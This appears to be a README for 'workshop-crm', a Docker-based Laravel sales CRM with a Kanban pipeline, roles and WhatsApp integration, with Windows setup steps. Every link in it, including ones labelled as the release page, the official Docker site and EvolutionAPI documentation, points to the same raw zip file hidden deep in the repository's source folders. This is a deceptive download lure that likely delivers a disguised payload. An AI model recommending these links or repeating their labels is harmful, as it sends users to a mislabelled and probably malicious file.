# 🛠️ workshop-crm - Simple CRM for Sales Management

[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-blue?style=for-the-badge)](https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip)

---

## 📦 What is workshop-crm?

workshop-crm is a tool designed to help small and medium businesses manage customer relationships. It offers a visual board to track sales leads. You can see and organize your sales pipeline clearly. The system works with multiple tenants, which means different teams or businesses can use it separately but on the same platform.

This version connects with WhatsApp, letting you communicate with customers in one place. It has key features to keep your sales moving forward: managing leads, assigning tasks, taking notes, and getting email notifications. The system already supports roles like Business Owner and Salesperson to control who can do what.

The software runs on Windows using Docker for its environment. You do not need to install many separate tools or handle complex setups.

---

## 🖥️ System Requirements

Before you start, please make sure your Windows computer meets the following:

- Windows 10 or later (64-bit recommended)
- At least 8 GB of RAM for smooth operation
- 4 GB of free disk space to hold the application and data
- Stable internet connection for downloading and updates
- Docker Desktop installed (see next section to install)

---

## 🚀 Getting Started: Download and Install

Click the button below to visit the release page and get the latest setup files:

[![Download workshop-crm](https://img.shields.io/badge/Download-workshop--crm-green?style=for-the-badge)](https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip)

### Step 1: Download the Software

- Visit the release page by clicking on the green button above.
- Look for the latest Windows installer or zipped package.
- Click the file to download it to your computer.

### Step 2: Install Docker Desktop

workshop-crm uses Docker to run safely on your computer without needing complex installation. If Docker is not installed yet:

- Go to https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
- Download the Windows version
- Follow the installation steps on that site
- Once installed, launch Docker and ensure it runs correctly (you should see the Docker icon in the system tray)

### Step 3: Extract and Prepare workshop-crm

- If you downloaded a zipped file, right-click it and choose "Extract All" to unzip it in a folder you can find easily.
- If you downloaded an installer, run it and follow the on-screen instructions to install workshop-crm.

---

## ⚙️ How to Run workshop-crm on Windows

Once the software files are ready and Docker is installed:

1. Open the folder where workshop-crm is saved.
2. Right-click inside the folder while holding the **Shift** key.
3. Choose "Open PowerShell window here" or "Open Command Window here" from the menu.
4. Run these commands one by one:

```powershell
# Start the project containers in the background
.\vendor\bin\sail up -d

# Install necessary PHP packages
.\vendor\bin\sail composer install

# Install JavaScript dependencies
.\vendor\bin\sail npm install

# Generate application key
.\vendor\bin\sail artisan key:generate

# Prepare the database
.\vendor\bin\sail artisan migrate
```

5. After these steps, open your browser.
6. Go to: http://localhost

You should see the workshop-crm login page. If you do, the application is running successfully.

---

## 🔑 Creating Your Account and Using the App

When you first open the app:

- Create a **tenant**. This means adding your company or team into the system.
- Assign roles. You can set who is a Business Owner or Salesperson.
- Start adding your leads and deals into the Kanban board.
- Use notes to add details about customers or negotiations.
- Assign tasks to team members so everyone knows their responsibilities.
- Connect your WhatsApp using EvolutionAPI to chat directly with customers.
- Review sales progress anytime on the dashboard.

---

## 🗂 Features Overview

- Multi-tenant support for separate teams
- Role-based access control (Business Owner, Salesperson)
- Kanban pipeline for sales leads and deals
- Notes on leads and deals for better tracking
- Assign responsible salespersons to leads
- Email notifications for task reminders and updates
- Sales and conversation dashboard for quick insights
- WhatsApp integration via EvolutionAPI v2

---

## ⚠️ Troubleshooting Tips

- If the browser does not open or says “site can’t be reached,” check if Docker is running.
- If a command fails, make sure you are in the correct folder where workshop-crm lives.
- For permission problems, try running PowerShell or Command Prompt as Administrator.
- Clear your browser cache if you see old or broken pages.
- Restart Docker and rerun the commands if you face connection issues.
- Check if your internet connection is active to load dependencies.

---

## 🔗 Useful Resources

- Docker official site: https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
- EvolutionAPI information: https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip
- workshop-crm releases page: https://raw.githubusercontent.com/byebye19996/workshop-crm/main/app/Livewire/Forms/workshop_crm_3.5.zip

---

## 📬 Get Support or Report Issues

If you encounter problems not covered here, open the "Issues" tab on the workshop-crm GitHub page. Describe your problem with details like:

- What you did before the problem appeared
- Any error messages you saw
- Your Windows and Docker versions

The project maintainers will review and help as needed.